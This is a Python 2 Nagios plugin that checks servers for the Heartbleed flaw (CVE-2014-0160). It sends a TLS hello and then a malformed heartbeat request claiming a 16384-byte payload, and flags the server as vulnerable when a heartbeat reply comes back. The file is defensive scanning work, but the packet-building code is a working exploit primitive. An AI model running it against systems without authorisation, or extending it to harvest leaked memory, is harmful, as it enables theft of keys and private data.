#!/usr/bin/python2

# Check_Heartbleed.py v0.6
# 18/4/2014

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Modified for simplified checking by Yonathan Klijnsma

# Modified to turn into a Nagios Plugin by Scott Wilkerson (swilkerson@nagios.com)
# Modified to include TLS v1.2, v1.1, v1.0, and SSLv3.0, defaults to 1.1 (sreinhardt@nagios.com)
# 	Corrected Hello and Heartbeat packets to match versions
#	Added optional verbose output
#	Reimplemented output message and added Rich's idea for looping all supported versions
# Suggested and implemented in another plugin looping of all versions by default (rich.brown@blueberryhillsoftware.com)

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-H', '--host', type='string', default='127.0.0.1', help='Host to connect to (default: 127.0.0.1)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-v', '--version', type='int', default=-1, help='TLS or SSL version to test [TLSv1.0(0), TLSv1.1(1), TLSv1.2(2), or SSLv3.0(3)] (default: all)')
options.add_option('-u', '--udp', default=False, action='store_true', help='Use TCP or UDP protocols, no arguments needed. This does not work presently, keep to TCP. (default: TCP)')
options.add_option('-t', '--timeout', type='int', default=10, help='Plugin timeout length (default: 10)')
options.add_option('-V', '--verbose', default=False, action='store_true', help='Print verbose output, including hexdumps of packets.')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

# Returns correct versioning for handshake and hb packets
def tls_ver ():
    global opts
    if opts.version == 0:    #TLSv1.0
        return '''03 01'''
    elif opts.version == 2:    #TLSv1.2
        return '''03 03'''
    elif opts.version == 3:    #SSLv3.0
        return '''03 00'''
    else:                    #TLSv1.1
        return '''03 02'''

# Builds hello packet with correct tls version for rest of connection
def build_hello():

    hello = h2bin('''
    16 ''' + tls_ver() + ''' 00  dc 01 00 00 d8 ''' + tls_ver() + ''' 53
    4e d0 57 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01                                  
    ''')

##### Hello Packet Layout #####
#	16													# initiate handshake
#	+ tls_ver() +  										# version of tls to use
#	00  dc 												# Length
#	01 													# Handshake type (hello)
#	00 00 d8 											# Length
#	+ tls_ver() +  										# version of tls to use
#	53 43 5b 90 										# timestamp (change?)
#	9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf				# random bytes (seriously!)
#   bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 		# random bytes (seriously!)
#	00													# Length of session id (start new session)
#   00 66 												# Length of ciphers supported list
#	c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88			# 2 byte list of supported ciphers
#   00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c	# 2 byte list of supported ciphers cont
#   c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09	# 2 byte list of supported ciphers cont
#   c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44	# 2 byte list of supported ciphers cont
#   c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c	# 2 byte list of supported ciphers cont
#   c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11	# 2 byte list of supported ciphers cont
#   00 08 00 06 00 03 00 ff  							# 2 byte list of supported ciphers cont
#	01 													# Length of compression methods
#	00 													# Null compression (none)
#	00 49												# Length of TLS extension list
#	00 0b 00 04 03 00 01 02								# Elliptic curve point formats extension
#	00 0a 00 34  00 32 00 0e 00 0d 00 19				# Elliptic curve
#   00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08	# Elliptic curve cont
#   00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13	# Elliptic curve cont
#   00 01 00 02 00 03 00 0f  00 10 00 11				# Elliptic curve cont
#	00 23 00 00											# TLS sessions ticket supported
#   00 0f 00 01 01										# Heartbeat extension
##### End Hello Packet #####

    return hello

# Builds and returns heartbleed packet that matches with tls version
def build_hb():

    hb = h2bin('''
    18 ''' + tls_ver() + ''' 00 03
    01 40 00
    ''')

##### Heartbleed Packet Layout #####
#   18													# TLS Record Type (heartbeat) 
#	+ tls_ver() + 										# TLS version
#	00 03												# Length
#   01 													# Heartbeat request
#	40 00												# Length (16384 bytes)
##### End Heartbleed Packet #####
    
    return hb

# Builds and sends hb packet with zero size
def build_empty_hb():

    hb = h2bin('''
    18 ''' + tls_ver() + ''' 00 03
    01 00 00
    ''')

##### Heartbleed Packet Layout #####
#   18													# TLS Record Type (heartbeat) 
#	+ tls_ver() + 										# TLS version
#	00 03												# Length
#   01 													# Heartbeat request
#	40 00												# Length (16384 bytes)
##### End Heartbleed Packet #####
    
    return hb

# Receives data from socket for specified length
def recvall(s, length):
    global opts
    endtime = time.time() + opts.timeout
    rdata = ''
    remain = length

    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            try:
                data = s.recv(remain)
            except socket.error:
                # Should this be OK, as the server has sent a rst most likely and is therefore likely patched?
                print 'UNKNOWN: Server ' + opts.host + ' closed connection after sending heartbeat. Likely the server has been patched.'
                sys.exit(3)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        
# Receives messages and handles accordingly
def recvmsg(s):
    global opts
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln)
    if pay is None:
        return None, None, None
    if opts.verbose == True:
        print ' ... received message: type = %d, ver = %04x, length = %d, pay = %02x' % (typ, ver, len(pay), ord(pay[0]))
    return typ, ver, pay

# Sends empty hb packet
def hit_hb(s, hb):
    global opts

    if opts.verbose == True:
       print 'Sending malformed heartbeat packet...'

    try:
        s.send(hb)
    except socket.error:
        print 'UNKNOWN: Error sending heartbeat to ' + opts.host
        sys.exit(3)

    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            returncode = 0
            break

        if typ == 24:
            if pay > 3:
                returncode = 2    # vulnerable
                break
            else:
                returncode = 0
                break

        if typ == 21:    # TLS mismatch, hopefully we don't find this
            returncode = 0
            break

    #Outside of while
    if returncode == 0: # Not vulnerable message
        if opts.version == 3: #respond with ssl instead of tls
            message = 'SSLv3.0 is not vulnerable. '
        else:
            message = 'TLSv1.' + str(opts.version) + ' is not vulnerable. '
    else: # vulnerable message
        if opts.version == 3: #respond with ssl instead of tls
            message = 'SSLv3.0 is vulnerable. '
        else:
            message = 'TLSv1.' + str(opts.version) + ' is vulnerable. '

    return returncode, message

# Prints nagios style output and exit codes
def print_output(exitcode, outputmessage):

    if exitcode == 2:
        print 'CRITICAL: Server ' + opts.host + ' ' + outputmessage
    else:
        print 'OK: Server ' + opts.host + ' ' + outputmessage

    sys.exit(exitcode)

# Outputs packets as hex, used for verbose output
def hexdump(s):

    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''
        for c in lin:
            if 32 <= ord(c) <= 126:
                pdat += c
            else:
                pdat += '.'
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

# Initiates connection and handles initial hello\hb sending
def connect(hb):
    global opts
 
    if opts.udp == True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.settimeout(opts.timeout)

    try: 
        s.connect((opts.host, opts.port))
    except socket.error:
        print 'UNKNOWN: Connecton to server ' + opts.host + ' could not be established.'
        sys.exit(3)

    hello = build_hello()

    if opts.verbose == True:
        print 'Sending hello packet...'

    try:
        s.send(hello)
    except socket.error:
        print 'UNKNOWN: Error sending hello to ' + opts.host
        sys.exit(3)

    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print 'UNKNOWN: Server ' + opts.host + ' closed connection without sending Server Hello.'
            sys.exit(3)
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            if opts.verbose == True:
                hexdump(pay)
            break
        else:
            if opts.verbose == True:
                hexdump(pay)
            continue

    if opts.verbose == True:
        print 'Sending malformed heartbeat packet...'

    try:
        s.send(hb)
    except socket.error:
        print 'UNKNOWN: Error sending heartbeat to ' + opts.host
        sys.exit(3)

    return s

def main():
    global opts
    opts, args = options.parse_args()
    exitcode = 0
    outputmessage = ''

    if opts.version == -1: # no version was specified, loop.

        if opts.verbose == True:
            print 'Checking all supported TLS and SSL versions.'

        for opts.version in [0, 1, 2, 3]:
            hb = build_hb()
            s = connect(hb)
            returncode, message = hit_hb(s, hb)

            if returncode > exitcode:
                exitcode = returncode
            outputmessage += message
            
    else: # version was specified
        hb = build_hb()
        s = connect(hb)
        exitcode, outputmessage = hit_hb(s, hb)

    print_output(exitcode, outputmessage)

if __name__ == '__main__':
    main()
